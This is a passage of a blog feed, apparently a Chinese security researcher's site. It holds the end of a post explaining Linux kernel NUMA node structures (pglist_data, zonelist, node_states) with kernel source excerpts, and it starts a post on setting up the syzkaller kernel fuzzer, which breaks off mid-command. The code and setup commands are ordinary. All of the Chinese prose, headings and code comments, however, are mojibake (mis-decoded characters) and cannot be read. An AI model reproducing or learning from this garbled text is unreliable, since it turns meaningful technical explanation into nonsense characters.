æ‰€æœ‰ç‰©ç†é¡µçš„å¤§å°ï¼ŒåŒ…æ‹¬ç©ºæ´ */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> node_id;</span><br><span class="line">    <span class="type">wait_queue_head_t</span> kswapd_wait;</span><br><span class="line">    <span class="type">wait_queue_head_t</span> pfmemalloc_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">kswapd</span>;</span>    <span class="comment">/* ç”± mem_hotplug_begin/end() ä¿æŠ¤ */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> kswapd_order;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> <span class="title">kswapd_highest_zoneidx</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> kswapd_failures;        <span class="comment">/* è¿›è¡Œäº† &#x27;reclaimed == 0&#x27; åˆ¤æ–­çš„æ¬¡æ•° */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPACTION</span></span><br><span class="line">    <span class="type">int</span> kcompactd_max_order;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> <span class="title">kcompactd_highest_zoneidx</span>;</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span> kcompactd_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">kcompactd</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * è¿™æ˜¯æ¯ä¸ª node ä¿ç•™çš„å¯¹ç”¨æˆ·ç©ºé—´åˆ†é…ä¸å¯ç”¨çš„é¡µé¢</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>        totalreserve_pages;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * è‹¥å­˜åœ¨æ›´å¤šçš„æœªæ˜ å°„é¡µé¢ï¼Œåˆ™èŠ‚ç‚¹å›æ”¶å°†ä¼šå˜å¾—æ´»è·ƒ</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>        min_unmapped_pages;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>        min_slab_pages;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_NUMA */</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* é¡µå›æ”¶ä½¿ç”¨çš„å†™æ•æ„Ÿå­—æ®µ */</span></span><br><span class="line">    ZONE_PADDING(_pad1_)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEFERRED_STRUCT_PAGE_INIT</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * è‹¥åœ¨å¤§æœºå™¨ä¸Šçš„å†…å­˜åˆå§‹åŒ–è¢«æ¨è¿Ÿäº†ï¼Œé‚£ä¹ˆè¿™æ˜¯</span></span><br><span class="line"><span class="comment">     * ç¬¬ä¸€ä¸ªéœ€è¦è¢«åˆå§‹åŒ–çš„ PFN</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> first_deferred_pfn;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_DEFERRED_STRUCT_PAGE_INIT */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_TRANSPARENT_HUGEPAGE</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">deferred_split</span> <span class="title">deferred_split_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* é¡µå›æ”¶æ‰«æå™¨é€šå¸¸è®¿é—®çš„å­—æ®µ */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * <span class="doctag">NOTE:</span> è‹¥å¼€å¯äº† MEMCG åˆ™å…¶å°†ä¸ä¼šè¢«ä½¿ç”¨</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * ä½¿ç”¨ mem_cgroup_lruvec() ä»¥æŸ¥è¯¢ lruvecs.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">lruvec</span>        __<span class="title">lruvec</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>        flags;</span><br><span class="line"></span><br><span class="line">    ZONE_PADDING(_pad2_)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Per-node vmstats */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_nodestat</span> __<span class="title">percpu</span> *<span class="title">per_cpu_nodestats</span>;</span></span><br><span class="line">    <span class="type">atomic_long_t</span>        vm_stat[NR_VM_NODE_STAT_ITEMS];</span><br><span class="line">&#125; <span class="type">pg_data_t</span>;</span><br></pre></td></tr></table></figure><h2 id="å‡ ä¸ªæ¯”è¾ƒé‡è¦çš„å­—æ®µ"><a href="#å‡ ä¸ªæ¯”è¾ƒé‡è¦çš„å­—æ®µ" class="headerlink" title="å‡ ä¸ªæ¯”è¾ƒé‡è¦çš„å­—æ®µ"></a>å‡ ä¸ªæ¯”è¾ƒé‡è¦çš„å­—æ®µ</h2><p>ç®€å•è®²è®²å…¶ä¸­å‡ ä¸ªé‡è¦çš„æˆå‘˜</p><h3 id="node-zones-ï¼šnode-çš„-zone-åˆ—è¡¨"><a href="#node-zones-ï¼šnode-çš„-zone-åˆ—è¡¨" class="headerlink" title="**node_zones**ï¼šnode çš„ zone åˆ—è¡¨"></a>**node_zones**ï¼šnode çš„ zone åˆ—è¡¨</h3><p>èŠ‚ç‚¹ä¸­æœ€é‡è¦çš„å­—æ®µ <code>node_zones</code> ä½œä¸ºä¸€ä¸ª <code>zone ç»“æ„ä½“æ•°ç»„</code> è®°å½•äº†<strong>æœ¬èŠ‚ç‚¹ä¸Šæ‰€æœ‰çš„ zone</strong>ï¼Œå…¶ä¸­æœ‰æ•ˆçš„ zone çš„ä¸ªæ•°ç”±èŠ‚ç‚¹ç»“æ„ä½“çš„ <code>nr_zones</code> å­—æ®µæŒ‡å‡º</p><h3 id="node-zonelistsï¼šå†…å­˜åˆ†é…æ—¶å¤‡ç”¨-zone-çš„æœç´¢é¡ºåº"><a href="#node-zonelistsï¼šå†…å­˜åˆ†é…æ—¶å¤‡ç”¨-zone-çš„æœç´¢é¡ºåº" class="headerlink" title="node_zonelistsï¼šå†…å­˜åˆ†é…æ—¶å¤‡ç”¨ zone çš„æœç´¢é¡ºåº"></a>node_zonelistsï¼šå†…å­˜åˆ†é…æ—¶å¤‡ç”¨ zone çš„æœç´¢é¡ºåº</h3><p>è¯¥å­—æ®µç”¨ä»¥ç¡®å®šå†…å­˜åˆ†é…æ—¶å¯¹å¤‡ç”¨çš„ zone çš„æœç´¢é¡ºåºï¼Œåœ¨æœ¬èŠ‚ç‚¹å¸¸è§„å†…å­˜åˆ†é…å¤±è´¥æ—¶ä¼šæ²¿ç€è¿™ä¸ªæ•°ç»„è¿›è¡Œæœç´¢ï¼Œå…¶ä¸­åŒ…å«çš„ zone <strong>å¯ä»¥æ˜¯éæœ¬èŠ‚ç‚¹çš„ zone</strong></p><p>è¿™æ˜¯ä¸€ä¸ªå…¶ä¸ºä¸€ä¸ª <code>zonelist</code> ç±»å‹çš„<strong>ç»“æ„ä½“æ•°ç»„</strong>ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * å•æ¬¡åˆ†é…è¯·æ±‚åœ¨ä¸€ä¸ª zonelist ä¸Šæ“ä½œ. ä¸€ä¸ª zonelist ä¾¿æ˜¯ä¸€ç»„ zone çš„åˆ—è¡¨ï¼Œ</span></span><br><span class="line"><span class="comment"> * å…¶ä¸­ç¬¬ä¸€ä¸ª zone ä¸ºåˆ†é…çš„â€œç›®æ ‡â€ï¼Œè€Œå…¶ä»–çš„ zone ä¸ºåå¤‡çš„zoneï¼Œä¼˜å…ˆçº§é™ä½ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * ä¸ºäº†æé«˜ zonelist çš„è¯»å–é€Ÿåº¦, åœ¨ zonerefs ä¸­åŒ…å«æ­£åœ¨è¢«è¯»å–çš„ entry çš„ zone indexã€‚</span></span><br><span class="line"><span class="comment"> * ç”¨æ¥è®¿é—®æ‰€ç»™çš„ zoneref ç»“æ„ä½“ä¿¡æ¯çš„å¸®åŠ©å‡½æ•°æœ‰ï¼š</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * zonelist_zone()- è¿”å›ä¸€ä¸ª struct zone çš„æŒ‡é’ˆä½œä¸º _zonerefs ä¸­çš„ä¸€ä¸ª entry</span></span><br><span class="line"><span class="comment"> * zonelist_zone_idx()- è¿”å›ä½œä¸º entry çš„ zone çš„ index</span></span><br><span class="line"><span class="comment"> * zonelist_node_idx()- è¿”å›ä½œä¸º entry çš„ node çš„ index</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zonelist</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> _<span class="title">zonerefs</span>[<span class="title">MAX_ZONES_PER_ZONELIST</span> + 1];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°çš„æ˜¯å…¶ä¸ºä¸€ä¸ª  <code>zoneref</code> ç±»å‹çš„ç»“æ„ä½“æ•°ç»„ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼ŒåŒ…å«äº†ä¸€ä¸ª zone çš„æŒ‡é’ˆä»¥åŠä¸€ä¸ª indexï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * è¯¥ç»“æ„åŒ…å«äº† zonelist ä¸­ä¸€ä¸ª zone çš„ä¿¡æ¯ã€‚ </span></span><br><span class="line"><span class="comment"> * å…¶è¢«å‚¨å­˜åœ¨è¿™é‡Œä»¥é¢„é˜²å¯¹å¤§ç»“æ„ä½“çš„è§£å¼•ç”¨ä¸å¯¹è¡¨çš„æŸ¥è¯¢ã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>;</span><span class="comment">/* æŒ‡å‘å®é™…ä¸Šçš„ zone çš„æŒ‡é’ˆ */</span></span><br><span class="line"><span class="type">int</span> zone_idx;<span class="comment">/* zone_idx(zoneref-&gt;zone) */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="nr-zonesï¼šnode-ä¸­-zone-çš„æ•°é‡"><a href="#nr-zonesï¼šnode-ä¸­-zone-çš„æ•°é‡" class="headerlink" title="nr_zonesï¼šnode ä¸­ zone çš„æ•°é‡"></a>nr_zonesï¼šnode ä¸­ zone çš„æ•°é‡</h3><p>è¯¥å­—æ®µå­˜å‚¨äº†è¯¥èŠ‚ç‚¹ä¸­æ‰€æœ‰å¯ç”¨çš„ zone çš„æ•°é‡</p><h3 id="node-start-pfnï¼šnode-çš„èµ·å§‹é¡µæ¡†æ ‡å·"><a href="#node-start-pfnï¼šnode-çš„èµ·å§‹é¡µæ¡†æ ‡å·" class="headerlink" title="node_start_pfnï¼šnode çš„èµ·å§‹é¡µæ¡†æ ‡å·"></a>node_start_pfnï¼šnode çš„èµ·å§‹é¡µæ¡†æ ‡å·</h3><p>è¯¥å­—æ®µè®°å½•äº†è¯¥èŠ‚ç‚¹ä¸Šçš„ç‰©ç†å†…å­˜èµ·å§‹é¡µæ¡†æ ‡å·</p><h3 id="node-present-pagesï¼šnode-ä¸­ç‰©ç†é¡µçš„æ€»æ•°é‡"><a href="#node-present-pagesï¼šnode-ä¸­ç‰©ç†é¡µçš„æ€»æ•°é‡" class="headerlink" title="node_present_pagesï¼šnode ä¸­ç‰©ç†é¡µçš„æ€»æ•°é‡"></a>node_present_pagesï¼šnode ä¸­ç‰©ç†é¡µçš„æ€»æ•°é‡</h3><p>è¯¥å­—æ®µè®°å½•äº†èŠ‚ç‚¹ä¸­å¯ç”¨çš„ç‰©ç†é¡µçš„æ€»æ•°é‡</p><h3 id="unsigned-long-node-spanned-pagesï¼š-node-ä¸­ç‰©ç†é¡µçš„æ€»å¤§å°"><a href="#unsigned-long-node-spanned-pagesï¼š-node-ä¸­ç‰©ç†é¡µçš„æ€»å¤§å°" class="headerlink" title="unsigned long node_spanned_pagesï¼š node ä¸­ç‰©ç†é¡µçš„æ€»å¤§å°"></a>unsigned long node_spanned_pagesï¼š node ä¸­ç‰©ç†é¡µçš„æ€»å¤§å°</h3><p>è¯¥å­—æ®µè®°å½•äº†èŠ‚ç‚¹ä¸Š<strong>åŒ…æ‹¬ç©ºæ´åœ¨å†…</strong>çš„é¡µå¸§ä¸ºå•ä½çš„è¯¥èŠ‚ç‚¹å†…å­˜çš„æ€»é•¿åº¦</p><h3 id="node-idï¼šnode-çš„æ ‡å·"><a href="#node-idï¼šnode-çš„æ ‡å·" class="headerlink" title="node_idï¼šnode çš„æ ‡å·"></a>node_idï¼šnode çš„æ ‡å·</h3><p>è¯¥å­—æ®µè®°å½•äº†è¯¥èŠ‚ç‚¹åœ¨ç³»ç»Ÿä¸­çš„æ ‡å·ï¼Œä» 0 å¼€å§‹</p><h2 id="node-å­˜å‚¨æ–¹å¼ï¼šå…¨å±€æ•°ç»„-node-data"><a href="#node-å­˜å‚¨æ–¹å¼ï¼šå…¨å±€æ•°ç»„-node-data" class="headerlink" title="node å­˜å‚¨æ–¹å¼ï¼šå…¨å±€æ•°ç»„ node_data[]"></a>node å­˜å‚¨æ–¹å¼ï¼šå…¨å±€æ•°ç»„ node_data[]</h2><p>åœ¨ <code>/arch/x86/mm/numa.c</code> ä¸­å®šä¹‰äº†ä¸€ä¸ª pglist_data æ•°ç»„ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span> *<span class="title">node_data</span>[<span class="title">MAX_NUMNODES</span>] __<span class="title">read_mostly</span>;</span></span><br><span class="line">EXPORT_SYMBOL(node_data);</span><br></pre></td></tr></table></figure><p>è¯¥æ•°ç»„ä¸­ä¿å­˜äº†ç³»ç»Ÿä¸­çš„<strong>æ‰€æœ‰çš„èŠ‚ç‚¹</strong></p><p>ç”±æ­¤ï¼Œæˆ‘ä»¬æœ€ç»ˆå¾—åˆ°è¿™æ ·ä¸€å¼ æ¶æ„å›¾ï¼š</p><blockquote><p>è¿˜æ˜¯å·çš„å›¾ï¼Œä¾µåˆ </p></blockquote><p><img src="https://i.loli.net/2021/11/28/KcHILforOySi8YR.png" alt="image.png"></p><blockquote><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>numactl</code> å·¥å…·æ¥æŸ¥çœ‹ç³»ç»Ÿä¸­çš„èŠ‚ç‚¹ä¿¡æ¯ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">numactl --hardware</span></span><br><span class="line">available: 1 nodes (0)</span><br><span class="line">node 0 cpus: 0 1 2 3</span><br><span class="line">node 0 size: 11942 MB</span><br><span class="line">node 0 free: 4464 MB</span><br><span class="line">node distances:</span><br><span class="line">node   0 </span><br><span class="line">  0:  10 </span><br></pre></td></tr></table></figure><blockquote><p>ç¬”è€…çš„æœºå™¨æ¯”è¾ƒå¼±ï¼Œåªæœ‰ä¸€ä¸ªèŠ‚ç‚¹</p></blockquote></blockquote><h2 id="node-çŠ¶æ€ï¼šå…¨å±€æ•°ç»„-node-states"><a href="#node-çŠ¶æ€ï¼šå…¨å±€æ•°ç»„-node-states" class="headerlink" title="node çŠ¶æ€ï¼šå…¨å±€æ•°ç»„ node_states[]"></a>node çŠ¶æ€ï¼šå…¨å±€æ•°ç»„ node_states[]</h2><p>åœ¨ <code>/mm/page_alloc.c</code> ä¸­å®šä¹‰äº†ä¸€ä¸ªå…¨å±€æ•°ç»„ <code>node_states</code> ç”¨ä»¥æ ‡è¯†å¯¹åº”æ ‡å·çš„èŠ‚ç‚¹çš„çŠ¶æ€ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Array of node states.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">nodemask_t</span> node_states[NR_NODE_STATES] __read_mostly = &#123;</span><br><span class="line">    [N_POSSIBLE] = NODE_MASK_ALL,</span><br><span class="line">    [N_ONLINE] = &#123; &#123; [<span class="number">0</span>] = <span class="number">1UL</span> &#125; &#125;,</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONFIG_NUMA</span></span><br><span class="line">    [N_NORMAL_MEMORY] = &#123; &#123; [<span class="number">0</span>] = <span class="number">1UL</span> &#125; &#125;,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_HIGHMEM</span></span><br><span class="line">    [N_HIGH_MEMORY] = &#123; &#123; [<span class="number">0</span>] = <span class="number">1UL</span> &#125; &#125;,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    [N_MEMORY] = &#123; &#123; [<span class="number">0</span>] = <span class="number">1UL</span> &#125; &#125;,</span><br><span class="line">    [N_CPU] = &#123; &#123; [<span class="number">0</span>] = <span class="number">1UL</span> &#125; &#125;,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>    <span class="comment">/* NUMA */</span></span></span><br><span class="line">&#125;;</span><br><span class="line">EXPORT_SYMBOL(node_states);</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œçš„ <code>nodemask_t</code> ç±»å‹ä¸ºä¸€ä¸ª<strong>ä½å›¾</strong>ç±»å‹ï¼Œå®šä¹‰äº <code>/include/linux/nodemask.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span> DECLARE_BITMAP(bits, MAX_NUMNODES); &#125; <span class="type">nodemask_t</span>;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªçŠ¶æ€ç”±ä¸€ä¸ªæšä¸¾ç±»å‹ <code>node_states</code> å®šä¹‰ï¼Œè¯¥æšä¸¾ç±»å‹å®šä¹‰äº <code>/include/linux/nodemask.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ä½æ©ç å°†ä¸ºæ‰€æœ‰èŠ‚ç‚¹ä¿å­˜</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">node_states</span> &#123;</span></span><br><span class="line">    N_POSSIBLE,        <span class="comment">/* èŠ‚ç‚¹åœ¨æŸä¸ªæ—¶åˆ»æ˜¯è”æœºçš„ */</span></span><br><span class="line">    N_ONLINE,        <span class="comment">/* èŠ‚ç‚¹æ˜¯è”æœºçš„ */</span></span><br><span class="line">    N_NORMAL_MEMORY,    <span class="comment">/* èŠ‚ç‚¹æœ‰ç€æ™®é€šçš„å†…å­˜ */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_HIGHMEM</span></span><br><span class="line">    N_HIGH_MEMORY,        <span class="comment">/* èŠ‚ç‚¹æœ‰ç€æ™®é€šæˆ–é«˜ç«¯å†…å­˜ */</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    N_HIGH_MEMORY = N_NORMAL_MEMORY,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    N_MEMORY,        <span class="comment">/* èŠ‚ç‚¹æœ‰ç€å†…å­˜(æ™®é€šï¼Œé«˜ç«¯ï¼Œå¯ç§»åŠ¨) */</span></span><br><span class="line">    N_CPU,        <span class="comment">/* èŠ‚ç‚¹æœ‰ç€ä¸€ä¸ªæˆ–å¤šä¸ª cpu */</span></span><br><span class="line">    N_GENERIC_INITIATOR,    <span class="comment">/* èŠ‚ç‚¹æœ‰ä¸€ä¸ªæˆ–å¤šä¸ª Generic Initiators */</span></span><br><span class="line">    NR_NODE_STATES</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;æ— å†…é¬¼ï¼Œæ¥ç‚¹å†…å­˜æ¡&lt;/p&gt;</summary>
    
    
    
    <category term="OS" scheme="http://blog.arttnba3.cn/categories/OS/"/>
    
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="å­¦ä¹ æœ­è®°" scheme="http://blog.arttnba3.cn/tags/%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="å†…å­˜ç®¡ç†" scheme="http://blog.arttnba3.cn/tags/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>ã€FUZZ.0x01ã€‘syzkaller - Iï¼šä½¿ç”¨ syzkaller è¿›è¡Œæ¼æ´æŒ–æ˜</title>
    <link href="http://blog.arttnba3.cn/2021/11/24/FUZZ-0X01-SYZKALLER-I/"/>
    <id>http://blog.arttnba3.cn/2021/11/24/FUZZ-0X01-SYZKALLER-I/</id>
    <published>2021-11-23T19:09:11.000Z</published>
    <updated>2022-07-03T20:07:26.670Z</updated>
    
    <content type="html"><![CDATA[<p>å°è¯•éå†æ‰€æœ‰çš„ä¸–ç•Œçº¿</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>syzkaller æ˜¯ç”± Google å¼€å‘çš„ä¸€ä¸ªååˆ†å¼ºå¤§çš„é’ˆå¯¹å†…æ ¸çš„ fuzzerï¼Œè‡ªå…¶é¢ä¸–ä»¥æ¥å·²ç»å¸®åŠ©å…¨ä¸–ç•Œçš„å†…æ ¸å®‰å…¨ç ”ç©¶å‘˜å‘ç°äº†æ•°é‡æƒŠäººçš„å†…æ ¸æ¼æ´</p><p>æœ¬ç¯‡æ–‡ç« ä¸­ç¬”è€…å°†ç®€è¿° syzkaller çš„ä½¿ç”¨æ–¹æ³•</p><h1 id="0x01-ç¯å¢ƒé…ç½®"><a href="#0x01-ç¯å¢ƒé…ç½®" class="headerlink" title="0x01.ç¯å¢ƒé…ç½®"></a>0x01.ç¯å¢ƒé…ç½®</h1><blockquote><p>è¿™é‡Œå‚ç…§å®˜æ–¹æ–‡æ¡£è¿›è¡Œé…ç½®ï¼š <a href="https://github.com/google/syzkaller">https://github.com/google/syzkaller</a></p><p>ç¬”è€…æœ¬åœ°ç¯å¢ƒï¼šUbuntu 21.04</p></blockquote><p><strong>åœ¨å®‰è£…ä¹‹å‰è¯·ç¡®ä¿ä½ çš„ç”µè„‘å…·æœ‰è¶³å¤Ÿçš„è¿è¡Œå†…å­˜ä¸å­˜å‚¨ç©ºé—´ï¼</strong>ï¼ˆç¬”è€…çš„2Gé˜¿é‡Œäº‘å­¦ç”Ÿæœºå°±è¢«æç‚¸äº†</p><p>è¦ä½¿ç”¨ syzkaller è¿›è¡Œæ¼æ´æŒ–æ˜ï¼Œæˆ‘ä»¬éœ€è¦ï¼š</p><ul><li><code>Go compiler and syzkaller itself</code></li><li><code>C compiler with coverage support</code></li><li><code>Linux kernel with coverage additions</code></li><li><code>Virtual machine or a physical device</code></li></ul><h2 id="å®‰è£…ä¾èµ–"><a href="#å®‰è£…ä¾èµ–" class="headerlink" title="å®‰è£…ä¾èµ–"></a>å®‰è£…ä¾èµ–</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt update</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt install make gcc flex bison libncurses-dev libelf-dev libssl-dev clang clang-format</span></span><br></pre></td></tr></table></figure><h2 id="é…ç½®-golang-ç¯å¢ƒ"><a href="#é…ç½®-golang-ç¯å¢ƒ" class="headerlink" title="é…ç½® golang ç¯å¢ƒ"></a>é…ç½® golang ç¯å¢ƒ</h2><p>é¦–å…ˆé…ç½® golang ç¯å¢ƒï¼Œå¯ä»¥å‚ç…§<a href="https://golang.org/doc/install">å®˜æ–¹æ–‡æ¡£</a>ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">wget https://dl.google.com/go/go1.14.2.linux-amd64.tar.gz</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tar -xf go1.14.2.linux-amd64.tar.gz</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">mv</span> go goroot</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">mkdir</span> gopath</span></span><br></pre></td></tr></table></figure><p>åœ¨ <code>/etc/profile</code> ä¸­å†™å…¥å¦‚ä¸‹é…ç½®ï¼Œé‡å¯ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ <code>YourGoPath</code><strong>åº”å½“æ›¿æ¢ä¸ºä½ å®é™…å­˜æ”¾ go çš„è·¯å¾„</strong>ï¼Œåœ¨ä¸Šä¸€æ­¥çš„ç»ˆç«¯ä¸­è¾“å…¥ <code>pwd</code> åå°†å…¶å€¼æ›¿æ¢åˆ°ä¸‹æ–¹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> GOPATH=YourGoPath/gopath</span><br><span class="line"><span class="built_in">export</span> GOROOT=YourGoPath/goroot</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$GOPATH</span>/bin:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$GOROOT</span>/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><h2 id="ç¼–è¯‘-syzkaller"><a href="#ç¼–è¯‘-syzkaller" class="headerlink" title="ç¼–è¯‘ syzkaller"></a>ç¼–è¯‘ syzkaller</h2><p>å®‰è£… syzkaller æœ¬ä½“</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">go get -u -d github.com/google/syzkaller/prog</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> 